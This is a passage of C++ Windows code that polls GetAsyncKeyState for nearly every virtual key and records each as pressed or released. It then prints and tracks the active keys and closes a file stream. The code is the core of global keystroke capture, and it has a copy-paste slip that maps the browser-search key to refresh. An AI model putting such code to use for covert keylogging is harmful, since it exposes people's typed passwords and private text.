        if ((keyState = ::GetAsyncKeyState(VK_BROWSER_FAVORITES))) keyState & keySize ? ::registerKeyAsActive(BrowserFavorite) : ::registerKeyAsReleased(BrowserFavorite); else ::unregisterKey(BrowserFavorite);
        if ((keyState = ::GetAsyncKeyState(VK_BROWSER_FORWARD))) keyState & keySize ? ::registerKeyAsActive(BrowserForwardFeed) : ::registerKeyAsReleased(BrowserForwardFeed); else ::unregisterKey(BrowserForwardFeed);
        if ((keyState = ::GetAsyncKeyState(VK_BROWSER_HOME))) keyState & keySize ? ::registerKeyAsActive(BrowserStart) : ::registerKeyAsReleased(BrowserStart); else ::unregisterKey(BrowserStart);
        if ((keyState = ::GetAsyncKeyState(VK_BROWSER_REFRESH))) keyState & keySize ? ::registerKeyAsActive(BrowserRefresh) : ::registerKeyAsReleased(BrowserRefresh); else ::unregisterKey(BrowserRefresh);
        if ((keyState = ::GetAsyncKeyState(VK_BROWSER_SEARCH))) keyState & keySize ? ::registerKeyAsActive(BrowserRefresh) : ::registerKeyAsReleased(BrowserRefresh); else ::unregisterKey(BrowserRefresh);
        if ((keyState = ::GetAsyncKeyState(VK_BROWSER_STOP))) keyState & keySize ? ::registerKeyAsActive(BrowserStop) : ::registerKeyAsReleased(BrowserStop); else ::unregisterKey(BrowserStop);
        if ((keyState = ::GetAsyncKeyState(VK_CAPITAL))) keyState & keySize ? ::registerKeyAsActive(CapitalLock) : ::registerKeyAsReleased(CapitalLock); else ::unregisterKey(CapitalLock);
        if ((keyState = ::GetAsyncKeyState(VK_RETURN))) keyState & keySize ? ::registerKeyAsActive(CarriageReturn) : ::registerKeyAsReleased(CarriageReturn); else ::unregisterKey(CarriageReturn);
        if ((keyState = ::GetAsyncKeyState(VK_CLEAR))) keyState & keySize ? ::registerKeyAsActive(Clear) : ::registerKeyAsReleased(Clear); else ::unregisterKey(Clear);
        if ((keyState = ::GetAsyncKeyState(VK_LCONTROL))) keyState & keySize ? ::registerKeyAsActive(LeftControl) : ::registerKeyAsReleased(LeftControl); else ::unregisterKey(LeftControl);
        if ((keyState = ::GetAsyncKeyState(VK_RCONTROL))) keyState & keySize ? ::registerKeyAsActive(RightControl) : ::registerKeyAsReleased(RightControl); else ::unregisterKey(RightControl);
        if ((keyState = ::GetAsyncKeyState(VK_CONTROL))) keyState & keySize ? ::registerKeyAsActive(Control) : ::registerKeyAsReleased(Control); else ::unregisterKey(Control);
        if ((keyState = ::GetAsyncKeyState(VK_CANCEL))) keyState & keySize ? ::registerKeyAsActive(ControlBreak) : ::registerKeyAsReleased(ControlBreak); else ::unregisterKey(ControlBreak);
        if ((keyState = ::GetAsyncKeyState(VK_CRSEL))) keyState & keySize ? ::registerKeyAsActive(CursorSelect) : ::registerKeyAsReleased(CursorSelect); else ::unregisterKey(CursorSelect);
        if ((keyState = ::GetAsyncKeyState(VK_DELETE))) keyState & keySize ? ::registerKeyAsActive(Delete) : ::registerKeyAsReleased(Delete); else ::unregisterKey(Delete);
        if ((keyState = ::GetAsyncKeyState(VK_DOWN))) keyState & keySize ? ::registerKeyAsActive(DownArrow) : ::registerKeyAsReleased(DownArrow); else ::unregisterKey(DownArrow);
        if ((keyState = ::GetAsyncKeyState(VK_END))) keyState & keySize ? ::registerKeyAsActive(End) : ::registerKeyAsReleased(End); else ::unregisterKey(End);
        if ((keyState = ::GetAsyncKeyState(VK_EREOF))) keyState & keySize ? ::registerKeyAsActive(EraseEndOfFile) : ::registerKeyAsReleased(EraseEndOfFile); else ::unregisterKey(EraseEndOfFile);
        if ((keyState = ::GetAsyncKeyState(VK_ESCAPE))) keyState & keySize ? ::registerKeyAsActive(Keys::Escape) : ::registerKeyAsReleased(Keys::Escape); else ::unregisterKey(Keys::Escape);
        if ((keyState = ::GetAsyncKeyState(VK_EXECUTE))) keyState & keySize ? ::registerKeyAsActive(Execute) : ::registerKeyAsReleased(Execute); else ::unregisterKey(Execute);
        if ((keyState = ::GetAsyncKeyState(VK_EXSEL))) keyState & keySize ? ::registerKeyAsActive(ExecuteSelect) : ::registerKeyAsReleased(ExecuteSelect); else ::unregisterKey(ExecuteSelect);
        if ((keyState = ::GetAsyncKeyState(VK_F1))) keyState & keySize ? ::registerKeyAsActive(F1) : ::registerKeyAsReleased(F1); else ::unregisterKey(F1);
        if ((keyState = ::GetAsyncKeyState(VK_F2))) keyState & keySize ? ::registerKeyAsActive(F2) : ::registerKeyAsReleased(F2); else ::unregisterKey(F2);
        if ((keyState = ::GetAsyncKeyState(VK_F3))) keyState & keySize ? ::registerKeyAsActive(F3) : ::registerKeyAsReleased(F3); else ::unregisterKey(F3);
        if ((keyState = ::GetAsyncKeyState(VK_F4))) keyState & keySize ? ::registerKeyAsActive(F4) : ::registerKeyAsReleased(F4); else ::unregisterKey(F4);
        if ((keyState = ::GetAsyncKeyState(VK_F5))) keyState & keySize ? ::registerKeyAsActive(F5) : ::registerKeyAsReleased(F5); else ::unregisterKey(F5);
        if ((keyState = ::GetAsyncKeyState(VK_F6))) keyState & keySize ? ::registerKeyAsActive(F6) : ::registerKeyAsReleased(F6); else ::unregisterKey(F6);
        if ((keyState = ::GetAsyncKeyState(VK_F7))) keyState & keySize ? ::registerKeyAsActive(F7) : ::registerKeyAsReleased(F7); else ::unregisterKey(F7);
        if ((keyState = ::GetAsyncKeyState(VK_F8))) keyState & keySize ? ::registerKeyAsActive(F8) : ::registerKeyAsReleased(F8); else ::unregisterKey(F8);
        if ((keyState = ::GetAsyncKeyState(VK_F9))) keyState & keySize ? ::registerKeyAsActive(F9) : ::registerKeyAsReleased(F9); else ::unregisterKey(F9);
        if ((keyState = ::GetAsyncKeyState(VK_F10))) keyState & keySize ? ::registerKeyAsActive(F10) : ::registerKeyAsReleased(F10); else ::unregisterKey(F10);
        if ((keyState = ::GetAsyncKeyState(VK_F11))) keyState & keySize ? ::registerKeyAsActive(F11) : ::registerKeyAsReleased(F11); else ::unregisterKey(F11);
        if ((keyState = ::GetAsyncKeyState(VK_F12))) keyState & keySize ? ::registerKeyAsActive(F12) : ::registerKeyAsReleased(F12); else ::unregisterKey(F12);
        if ((keyState = ::GetAsyncKeyState(VK_F13))) keyState & keySize ? ::registerKeyAsActive(F13) : ::registerKeyAsReleased(F13); else ::unregisterKey(F13);
        if ((keyState = ::GetAsyncKeyState(VK_F14))) keyState & keySize ? ::registerKeyAsActive(F14) : ::registerKeyAsReleased(F14); else ::unregisterKey(F14);
        if ((keyState = ::GetAsyncKeyState(VK_F15))) keyState & keySize ? ::registerKeyAsActive(F15) : ::registerKeyAsReleased(F15); else ::unregisterKey(F15);
        if ((keyState = ::GetAsyncKeyState(VK_F16))) keyState & keySize ? ::registerKeyAsActive(F16) : ::registerKeyAsReleased(F16); else ::unregisterKey(F16);
        if ((keyState = ::GetAsyncKeyState(VK_F17))) keyState & keySize ? ::registerKeyAsActive(F17) : ::registerKeyAsReleased(F17); else ::unregisterKey(F17);
        if ((keyState = ::GetAsyncKeyState(VK_F18))) keyState & keySize ? ::registerKeyAsActive(F18) : ::registerKeyAsReleased(F18); else ::unregisterKey(F18);
        if ((keyState = ::GetAsyncKeyState(VK_F19))) keyState & keySize ? ::registerKeyAsActive(F19) : ::registerKeyAsReleased(F19); else ::unregisterKey(F19);
        if ((keyState = ::GetAsyncKeyState(VK_F20))) keyState & keySize ? ::registerKeyAsActive(F20) : ::registerKeyAsReleased(F20); else ::unregisterKey(F20);
        if ((keyState = ::GetAsyncKeyState(VK_F21))) keyState & keySize ? ::registerKeyAsActive(F21) : ::registerKeyAsReleased(F21); else ::unregisterKey(F21);
        if ((keyState = ::GetAsyncKeyState(VK_F22))) keyState & keySize ? ::registerKeyAsActive(F22) : ::registerKeyAsReleased(F22); else ::unregisterKey(F22);
        if ((keyState = ::GetAsyncKeyState(VK_F23))) keyState & keySize ? ::registerKeyAsActive(F23) : ::registerKeyAsReleased(F23); else ::unregisterKey(F23);
        if ((keyState = ::GetAsyncKeyState(VK_F24))) keyState & keySize ? ::registerKeyAsActive(F24) : ::registerKeyAsReleased(F24); else ::unregisterKey(F24);
        if ((keyState = ::GetAsyncKeyState(VK_HELP))) keyState & keySize ? ::registerKeyAsActive(Help) : ::registerKeyAsReleased(Help); else ::unregisterKey(Help);
        if ((keyState = ::GetAsyncKeyState(VK_HOME))) keyState & keySize ? ::registerKeyAsActive(Home) : ::registerKeyAsReleased(Home); else ::unregisterKey(Home);
        if ((keyState = ::GetAsyncKeyState(VK_TAB))) keyState & keySize ? ::registerKeyAsActive(HorizontalTab) : ::registerKeyAsReleased(HorizontalTab); else ::unregisterKey(HorizontalTab);
        if ((keyState = ::GetAsyncKeyState(VK_ACCEPT))) keyState & keySize ? ::registerKeyAsActive(IMEAccept) : ::registerKeyAsReleased(IMEAccept); else ::unregisterKey(IMEAccept);
        if ((keyState = ::GetAsyncKeyState(VK_CONVERT))) keyState & keySize ? ::registerKeyAsActive(IMEConvert) : ::registerKeyAsReleased(IMEConvert); else ::unregisterKey(IMEConvert);
        if ((keyState = ::GetAsyncKeyState(VK_FINAL))) keyState & keySize ? ::registerKeyAsActive(IMEFinal) : ::registerKeyAsReleased(IMEFinal); else ::unregisterKey(IMEFinal);
        if ((keyState = ::GetAsyncKeyState(VK_HANJA))) keyState & keySize ? ::registerKeyAsActive(IMEHanja) : ::registerKeyAsReleased(IMEHanja); else ::unregisterKey(IMEHanja);
        if ((keyState = ::GetAsyncKeyState(VK_HANGUL))) keyState & keySize ? ::registerKeyAsActive(IMEHangul) : ::registerKeyAsReleased(IMEHangul); else ::unregisterKey(IMEHangul);
        if ((keyState = ::GetAsyncKeyState(VK_JUNJA))) keyState & keySize ? ::registerKeyAsActive(IMEJunja) : ::registerKeyAsReleased(IMEJunja); else ::unregisterKey(IMEJunja);
        if ((keyState = ::GetAsyncKeyState(VK_KANA))) keyState & keySize ? ::registerKeyAsActive(IMEKana) : ::registerKeyAsReleased(IMEKana); else ::unregisterKey(IMEKana);
        if ((keyState = ::GetAsyncKeyState(VK_KANJI))) keyState & keySize ? ::registerKeyAsActive(IMEKanji) : ::registerKeyAsReleased(IMEKanji); else ::unregisterKey(IMEKanji);
        if ((keyState = ::GetAsyncKeyState(VK_MODECHANGE))) keyState & keySize ? ::registerKeyAsActive(IMEModeChangeRequest) : ::registerKeyAsReleased(IMEModeChangeRequest); else ::unregisterKey(IMEModeChangeRequest);
        if ((keyState = ::GetAsyncKeyState(VK_NONCONVERT))) keyState & keySize ? ::registerKeyAsActive(IMENonConvert) : ::registerKeyAsReleased(IMENonConvert); else ::unregisterKey(IMENonConvert);
        if ((keyState = ::GetAsyncKeyState(VK_PROCESSKEY))) keyState & keySize ? ::registerKeyAsActive(IMEProcess) : ::registerKeyAsReleased(IMEProcess); else ::unregisterKey(IMEProcess);
        if ((keyState = ::GetAsyncKeyState(VK_INSERT))) keyState & keySize ? ::registerKeyAsActive(Insert) : ::registerKeyAsReleased(Insert); else ::unregisterKey(Insert);
        if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_APP1))) keyState & keySize ? ::registerKeyAsActive(LaunchApplication1) : ::registerKeyAsReleased(LaunchApplication1); else ::unregisterKey(LaunchApplication1);
        if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_APP2))) keyState & keySize ? ::registerKeyAsActive(LaunchApplication2) : ::registerKeyAsReleased(LaunchApplication2); else ::unregisterKey(LaunchApplication2);
        if ((keyState = ::GetAsyncKeyState(VK_LEFT))) keyState & keySize ? ::registerKeyAsActive(LeftArrow) : ::registerKeyAsReleased(LeftArrow); else ::unregisterKey(LeftArrow);
        if ((keyState = ::GetAsyncKeyState(VK_LWIN))) keyState & keySize ? ::registerKeyAsActive(LeftWindowsMeta) : ::registerKeyAsReleased(LeftWindowsMeta); else ::unregisterKey(LeftWindowsMeta);
        if ((keyState = ::GetAsyncKeyState(VK_MEDIA_NEXT_TRACK))) keyState & keySize ? ::registerKeyAsActive(MediaNextTrack) : ::registerKeyAsReleased(MediaNextTrack); else ::unregisterKey(MediaNextTrack);
        if ((keyState = ::GetAsyncKeyState(VK_MEDIA_PLAY_PAUSE))) keyState & keySize ? ::registerKeyAsActive(MediaPlayPause) : ::registerKeyAsReleased(MediaPlayPause); else ::unregisterKey(MediaPlayPause);
        if ((keyState = ::GetAsyncKeyState(VK_MEDIA_PREV_TRACK))) keyState & keySize ? ::registerKeyAsActive(MediaPreviousTrack) : ::registerKeyAsReleased(MediaPreviousTrack); else ::unregisterKey(MediaPreviousTrack);
        if ((keyState = ::GetAsyncKeyState(VK_MEDIA_STOP))) keyState & keySize ? ::registerKeyAsActive(MediaStop) : ::registerKeyAsReleased(MediaStop); else ::unregisterKey(MediaStop);
        if ((keyState = ::GetAsyncKeyState(VK_NUMLOCK))) keyState & keySize ? ::registerKeyAsActive(NumberLock) : ::registerKeyAsReleased(NumberLock); else ::unregisterKey(NumberLock);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD0))) keyState & keySize ? ::registerKeyAsActive(NumberPad0) : ::registerKeyAsReleased(NumberPad0); else ::unregisterKey(NumberPad0);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD1))) keyState & keySize ? ::registerKeyAsActive(NumberPad1) : ::registerKeyAsReleased(NumberPad1); else ::unregisterKey(NumberPad1);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD2))) keyState & keySize ? ::registerKeyAsActive(NumberPad2) : ::registerKeyAsReleased(NumberPad2); else ::unregisterKey(NumberPad2);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD3))) keyState & keySize ? ::registerKeyAsActive(NumberPad3) : ::registerKeyAsReleased(NumberPad3); else ::unregisterKey(NumberPad3);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD4))) keyState & keySize ? ::registerKeyAsActive(NumberPad4) : ::registerKeyAsReleased(NumberPad4); else ::unregisterKey(NumberPad4);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD5))) keyState & keySize ? ::registerKeyAsActive(NumberPad5) : ::registerKeyAsReleased(NumberPad5); else ::unregisterKey(NumberPad5);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD6))) keyState & keySize ? ::registerKeyAsActive(NumberPad6) : ::registerKeyAsReleased(NumberPad6); else ::unregisterKey(NumberPad6);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD7))) keyState & keySize ? ::registerKeyAsActive(NumberPad7) : ::registerKeyAsReleased(NumberPad7); else ::unregisterKey(NumberPad7);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD8))) keyState & keySize ? ::registerKeyAsActive(NumberPad8) : ::registerKeyAsReleased(NumberPad8); else ::unregisterKey(NumberPad8);
        if ((keyState = ::GetAsyncKeyState(VK_NUMPAD9))) keyState & keySize ? ::registerKeyAsActive(NumberPad9) : ::registerKeyAsReleased(NumberPad9); else ::unregisterKey(NumberPad9);
        if ((keyState = ::GetAsyncKeyState(VK_NEXT))) keyState & keySize ? ::registerKeyAsActive(PageDown) : ::registerKeyAsReleased(PageDown); else ::unregisterKey(PageDown);
        if ((keyState = ::GetAsyncKeyState(VK_PRIOR))) keyState & keySize ? ::registerKeyAsActive(PageUp) : ::registerKeyAsReleased(PageUp); else ::unregisterKey(PageUp);
        if ((keyState = ::GetAsyncKeyState(VK_PLAY))) keyState & keySize ? ::registerKeyAsActive(Play) : ::registerKeyAsReleased(Play); else ::unregisterKey(Play);
        if ((keyState = ::GetAsyncKeyState(VK_SNAPSHOT))) keyState & keySize ? ::registerKeyAsActive(PrintScreen) : ::registerKeyAsReleased(PrintScreen); else ::unregisterKey(PrintScreen);
        if ((keyState = ::GetAsyncKeyState(VK_LBUTTON))) keyState & keySize ? ::registerKeyAsActive(MouseLeftButton) : ::registerKeyAsReleased(MouseLeftButton); else ::unregisterKey(MouseLeftButton);
        if ((keyState = ::GetAsyncKeyState(VK_MBUTTON))) keyState & keySize ? ::registerKeyAsActive(MouseMiddleButton) : ::registerKeyAsReleased(MouseMiddleButton); else ::unregisterKey(MouseMiddleButton);
        if ((keyState = ::GetAsyncKeyState(VK_RBUTTON))) keyState & keySize ? ::registerKeyAsActive(MouseRightButton) : ::registerKeyAsReleased(MouseRightButton); else ::unregisterKey(MouseRightButton);
        if ((keyState = ::GetAsyncKeyState(VK_XBUTTON1))) keyState & keySize ? ::registerKeyAsActive(MouseX1Button) : ::registerKeyAsReleased(MouseX1Button); else ::unregisterKey(MouseX1Button);
        if ((keyState = ::GetAsyncKeyState(VK_XBUTTON2))) keyState & keySize ? ::registerKeyAsActive(MouseX2Button) : ::registerKeyAsReleased(MouseX2Button); else ::unregisterKey(MouseX2Button);
        if ((keyState = ::GetAsyncKeyState(VK_PA1))) keyState & keySize ? ::registerKeyAsActive(PA1) : ::registerKeyAsReleased(PA1); else ::unregisterKey(PA1);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_CLEAR))) keyState & keySize ? ::registerKeyAsActive(OEMClear) : ::registerKeyAsReleased(OEMClear); else ::unregisterKey(OEMClear);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_102))) keyState & keySize ? ::registerKeyAsActive(OEMMiscellaneous) : ::registerKeyAsReleased(OEMMiscellaneous); else ::unregisterKey(OEMMiscellaneous);
        if ((keyState = (
            ::GetAsyncKeyState(0x92) || ::GetAsyncKeyState(0x93) || ::GetAsyncKeyState(0x94) || ::GetAsyncKeyState(0x95) || ::GetAsyncKeyState(0x96) ||
            ::GetAsyncKeyState(0xE1) ||
            ::GetAsyncKeyState(0xE3) || ::GetAsyncKeyState(0xE4) ||
            ::GetAsyncKeyState(0xE6) ||
            ::GetAsyncKeyState(0xE9) || ::GetAsyncKeyState(0xEA) || ::GetAsyncKeyState(0xEB) || ::GetAsyncKeyState(0xEC) || ::GetAsyncKeyState(0xED) || ::GetAsyncKeyState(0xEF) || ::GetAsyncKeyState(0xF0) || ::GetAsyncKeyState(0xF1) || ::GetAsyncKeyState(0xF2) || ::GetAsyncKeyState(0xF3) || ::GetAsyncKeyState(0xF4) || ::GetAsyncKeyState(0xF5)
        ))) keyState & keySize ? ::registerKeyAsActive(OEMSpecific) : ::registerKeyAsReleased(OEMSpecific); else ::unregisterKey(OEMSpecific);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_1))) keyState & keySize ? ::registerKeyAsActive(OEMMiscellaneous1) : ::registerKeyAsReleased(OEMMiscellaneous1); else ::unregisterKey(OEMMiscellaneous1);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_2))) keyState & keySize ? ::registerKeyAsActive(OEMMiscellaneous2) : ::registerKeyAsReleased(OEMMiscellaneous2); else ::unregisterKey(OEMMiscellaneous2);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_3))) keyState & keySize ? ::registerKeyAsActive(OEMMiscellaneous3) : ::registerKeyAsReleased(OEMMiscellaneous3); else ::unregisterKey(OEMMiscellaneous3);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_4))) keyState & keySize ? ::registerKeyAsActive(OEMMiscellaneous4) : ::registerKeyAsReleased(OEMMiscellaneous4); else ::unregisterKey(OEMMiscellaneous4);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_5))) keyState & keySize ? ::registerKeyAsActive(OEMMiscellaneous5) : ::registerKeyAsReleased(OEMMiscellaneous5); else ::unregisterKey(OEMMiscellaneous5);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_6))) keyState & keySize ? ::registerKeyAsActive(OEMMiscellaneous6) : ::registerKeyAsReleased(OEMMiscellaneous6); else ::unregisterKey(OEMMiscellaneous6);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_7))) keyState & keySize ? ::registerKeyAsActive(OEMMiscellaneous7) : ::registerKeyAsReleased(OEMMiscellaneous7); else ::unregisterKey(OEMMiscellaneous7);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_8))) keyState & keySize ? ::registerKeyAsActive(OEMMiscellaneous8) : ::registerKeyAsReleased(OEMMiscellaneous8); else ::unregisterKey(OEMMiscellaneous8);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_COMMA))) keyState & keySize ? ::registerKeyAsActive(OEMCommaSymbol) : ::registerKeyAsReleased(OEMCommaSymbol); else ::unregisterKey(OEMCommaSymbol);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_MINUS))) keyState & keySize ? ::registerKeyAsActive(OEMSubtracterSymbol) : ::registerKeyAsReleased(OEMSubtracterSymbol); else ::unregisterKey(OEMSubtracterSymbol);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_PERIOD))) keyState & keySize ? ::registerKeyAsActive(OEMPeriodSymbol) : ::registerKeyAsReleased(OEMPeriodSymbol); else ::unregisterKey(OEMPeriodSymbol);
        if ((keyState = ::GetAsyncKeyState(VK_OEM_PLUS))) keyState & keySize ? ::registerKeyAsActive(OEMAdderSymbol) : ::registerKeyAsReleased(OEMAdderSymbol); else ::unregisterKey(OEMAdderSymbol);
        if ((keyState = ::GetAsyncKeyState(VK_PAUSE))) keyState & keySize ? ::registerKeyAsActive(Pause) : ::registerKeyAsReleased(Pause); else ::unregisterKey(Pause);
        if ((keyState = ::GetAsyncKeyState(VK_PRINT))) keyState & keySize ? ::registerKeyAsActive(Print) : ::registerKeyAsReleased(Print); else ::unregisterKey(Print);
        if ((keyState = (
            ::GetAsyncKeyState(VK_NONAME) ||
            ::GetAsyncKeyState(0x0A) || ::GetAsyncKeyState(0x0B) ||
            ::GetAsyncKeyState(0x0E) || ::GetAsyncKeyState(0x0F) ||
            ::GetAsyncKeyState(0x16) ||
            ::GetAsyncKeyState(0x1A) ||
            ::GetAsyncKeyState(0x3A) || ::GetAsyncKeyState(0x40) ||
            ::GetAsyncKeyState(0x5E) ||
            ::GetAsyncKeyState(0xB8) || ::GetAsyncKeyState(0xB9) ||
            ::GetAsyncKeyState(0xC1) || ::GetAsyncKeyState(0xC2) || ::GetAsyncKeyState(0xC3) || ::GetAsyncKeyState(0xC4) || ::GetAsyncKeyState(0xC5) || ::GetAsyncKeyState(0xC6) || ::GetAsyncKeyState(0xC7) || ::GetAsyncKeyState(0xC8) || ::GetAsyncKeyState(0xC9) || ::GetAsyncKeyState(0xCA) || ::GetAsyncKeyState(0xCB) || ::GetAsyncKeyState(0xCC) || ::GetAsyncKeyState(0xCD) || ::GetAsyncKeyState(0xCE) || ::GetAsyncKeyState(0xCF) || ::GetAsyncKeyState(0xD0) || ::GetAsyncKeyState(0xD1) || ::GetAsyncKeyState(0xD2) || ::GetAsyncKeyState(0xD3) || ::GetAsyncKeyState(0xD4) || ::GetAsyncKeyState(0xD5) || ::GetAsyncKeyState(0xD6) || ::GetAsyncKeyState(0xD7) ||
            ::GetAsyncKeyState(0xE0)
        ))) keyState & keySize ? ::registerKeyAsActive(Reserved) : ::registerKeyAsReleased(Reserved); else ::unregisterKey(Reserved);
        if ((keyState = ::GetAsyncKeyState(VK_RIGHT))) keyState & keySize ? ::registerKeyAsActive(RightArrow) : ::registerKeyAsReleased(RightArrow); else ::unregisterKey(RightArrow);
        if ((keyState = ::GetAsyncKeyState(VK_RWIN))) keyState & keySize ? ::registerKeyAsActive(RightWindowsMeta) : ::registerKeyAsReleased(RightWindowsMeta); else ::unregisterKey(RightWindowsMeta);
        if ((keyState = ::GetAsyncKeyState(VK_SCROLL))) keyState & keySize ? ::registerKeyAsActive(ScrollLock) : ::registerKeyAsReleased(ScrollLock); else ::unregisterKey(ScrollLock);
        if ((keyState = ::GetAsyncKeyState(VK_SELECT))) keyState & keySize ? ::registerKeyAsActive(Select) : ::registerKeyAsReleased(Select); else ::unregisterKey(Select);
        if ((keyState = ::GetAsyncKeyState(VK_SEPARATOR))) keyState & keySize ? ::registerKeyAsActive(Separator) : ::registerKeyAsReleased(Separator); else ::unregisterKey(Separator);
        if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_MEDIA_SELECT))) keyState & keySize ? ::registerKeyAsActive(SelectMedia) : ::registerKeyAsReleased(SelectMedia); else ::unregisterKey(SelectMedia);
        if ((keyState = ::GetAsyncKeyState(VK_LSHIFT))) keyState & keySize ? ::registerKeyAsActive(LeftShift) : ::registerKeyAsReleased(LeftShift); else ::unregisterKey(LeftShift);
        if ((keyState = ::GetAsyncKeyState(VK_RSHIFT))) keyState & keySize ? ::registerKeyAsActive(RightShift) : ::registerKeyAsReleased(RightShift); else ::unregisterKey(RightShift);
        if ((keyState = ::GetAsyncKeyState(VK_SHIFT))) keyState & keySize ? ::registerKeyAsActive(Shift) : ::registerKeyAsReleased(Shift); else ::unregisterKey(Shift);
        if ((keyState = ::GetAsyncKeyState(VK_SLEEP))) keyState & keySize ? ::registerKeyAsActive(Keys::Sleep) : ::registerKeyAsReleased(Keys::Sleep); else ::unregisterKey(Keys::Sleep);
        if ((keyState = ::GetAsyncKeyState(VK_SPACE))) keyState & keySize ? ::registerKeyAsActive(Spacebar) : ::registerKeyAsReleased(Spacebar); else ::unregisterKey(Spacebar);
        if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_MAIL))) keyState & keySize ? ::registerKeyAsActive(StartMail) : ::registerKeyAsReleased(StartMail); else ::unregisterKey(StartMail);
        if ((keyState = (
            ::GetAsyncKeyState(0x88) || ::GetAsyncKeyState(0x89) || ::GetAsyncKeyState(0x8A) || ::GetAsyncKeyState(0x8B) || ::GetAsyncKeyState(0x8C) || ::GetAsyncKeyState(0x8D) || ::GetAsyncKeyState(0x8E) || ::GetAsyncKeyState(0x8F) ||
            ::GetAsyncKeyState(0x97) || ::GetAsyncKeyState(0x98) || ::GetAsyncKeyState(0x99) || ::GetAsyncKeyState(0x9A) || ::GetAsyncKeyState(0x9B) || ::GetAsyncKeyState(0x9C) || ::GetAsyncKeyState(0x9D) || ::GetAsyncKeyState(0x9E) || ::GetAsyncKeyState(0x9F) ||
            ::GetAsyncKeyState(0xD8) || ::GetAsyncKeyState(0xD9) || ::GetAsyncKeyState(0xDA) ||
            ::GetAsyncKeyState(0xE8)
        ))) keyState & keySize ? ::registerKeyAsActive(Unassigned) : ::registerKeyAsReleased(Unassigned); else ::unregisterKey(Unassigned);
        if ((keyState = ::GetAsyncKeyState(0x07))) keyState & keySize ? ::registerKeyAsActive(Undefined) : ::registerKeyAsReleased(Undefined); else ::unregisterKey(Undefined);
        if ((keyState = ::GetAsyncKeyState(VK_UP))) keyState & keySize ? ::registerKeyAsActive(UpArrow) : ::registerKeyAsReleased(UpArrow); else ::unregisterKey(UpArrow);
        if ((keyState = ::GetAsyncKeyState(VK_VOLUME_DOWN))) keyState & keySize ? ::registerKeyAsActive(VolumeDown) : ::registerKeyAsReleased(VolumeDown); else ::unregisterKey(VolumeDown);
        if ((keyState = ::GetAsyncKeyState(VK_VOLUME_MUTE))) keyState & keySize ? ::registerKeyAsActive(VolumeMute) : ::registerKeyAsReleased(VolumeMute); else ::unregisterKey(VolumeMute);
        if ((keyState = ::GetAsyncKeyState(VK_VOLUME_UP))) keyState & keySize ? ::registerKeyAsActive(VolumeUp) : ::registerKeyAsReleased(VolumeUp); else ::unregisterKey(VolumeUp);
        if ((keyState = ::GetAsyncKeyState(VK_ZOOM))) keyState & keySize ? ::registerKeyAsActive(Zoom) : ::registerKeyAsReleased(Zoom); else ::unregisterKey(Zoom);

        // ...
        ::printKeys();
        ::trackActiveKeys();
    }

    // ...
    fileStream.close();

    // Return
    return 0;
}
